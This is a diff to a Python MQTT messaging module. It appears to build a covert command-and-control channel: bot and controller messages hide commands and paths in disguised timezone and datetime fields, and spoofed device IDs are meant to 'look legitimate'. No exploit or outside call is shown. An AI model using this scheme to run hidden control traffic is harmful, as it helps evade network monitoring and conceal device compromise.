@@ -2,6 +2,7 @@
 from dataclasses import dataclass, field
 from typing import Optional
 from datetime import datetime
+from zoneinfo import ZoneInfo
 from paho.mqtt import client as mqtt
 import random
 import base64
@@ -113,23 +114,49 @@ class RequestMessage:
     def set_device_id(self, fake_device_id: str, ips: list[str]):
         """This device ID will be sent as is. It must look legitimate."""
         self.device_id = fake_device_id
+
+    def set_user_action(self, user_action: int):
+        if user_action not in COMMAND_TO_TIMEZONE:
+            raise Exception(f"Timezone is missing for action number {user_action}")
+        self.timezone = COMMAND_TO_TIMEZONE[user_action]
+
+        try:
+            now_utc = datetime.now(ZoneInfo("UTC"))
+            self.local_datetime = now_utc.astimezone(ZoneInfo(self.timezone)).isoformat()
+        except Exception:
+            # ignore error, set anything
+            self.local_datetime = datetime.now().isoformat()
+
     
-    def get_decrypted_message(self):
+    def get_message(self):
         if self.datetime_leap is not None:
             return decrypt(self.datetime_leap)
-        return None
-    
-    def get_deobfuscated_message(self):
         if self.timezones is not None:
             return deobfuscate(self.timezones)
         return None
     
-    def set_message(self, message: str):
-        """Set message to be sent, either encrypted or obfuscated depending on length. You can set message only once."""
+    def set_message(self, message: str | None):
+        """Set message to be sent, either encrypted or obfuscated depending on length."""
+        self.datetime_leap = None
+        self.timezones = None
+        
+        if message is None:
+            return
         if len(message) <= 100:
             self.timezones = obfuscate(message)
         else:
             self.datetime_leap = encrypt(message)
+
+def decode_payload(payload: str) -> RequestMessage:
+    try:
+        try:
+            return RequestMessage.from_json(payload)
+        except Exception:
+            raise UnknownDeviceError()
+    except UnknownDeviceError as ude:
+        raise ude
+    except Exception as ex:
+        raise Exception(f"Failed to decode payload {payload}: {ex}")
 
 @dataclass
 class ControllerMessage:
@@ -146,11 +173,28 @@ class ControllerMessage:
         if user_action is None:
             raise UnknownDeviceError()
         
-        path = request.get_decrypted_message()
-        if path is None:
-            path = request.get_deobfuscated_message()
+        path = request.get_message()
         
         return cls(user_action=user_action, path=path)
+
+@dataclass
+class BotMessage:
+    device_id: Optional[str]
+    message: Optional[str]
+
+    @classmethod
+    def from_request(cls, request: RequestMessage):
+        if request.get_user_action() is not None:
+            raise UnknownDeviceError()
+
+        device_id = request.device_id
+        message = request.get_message()
+
+        if device_id is None and message is None:
+            raise UnknownDeviceError()
+
+        return cls(device_id=device_id, message=message)
+        
 
 def encrypt(text: str):
     encoded = base64.b64encode(text.encode('utf-8')).decode('utf-8')
